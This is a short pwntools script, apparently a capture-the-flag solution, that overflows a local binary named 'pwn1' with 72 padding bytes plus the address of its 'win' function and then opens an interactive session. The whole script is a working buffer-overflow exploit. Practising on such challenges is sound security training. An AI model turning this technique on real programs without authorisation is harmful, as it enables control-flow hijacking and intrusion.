#!/usr/bin/python3

from pwn import *


elf = ELF("./pwn1")


io = elf.process()

payload = b"A"*72 + p64(elf.symbols.win)

io.sendline(payload)
io.interactive()
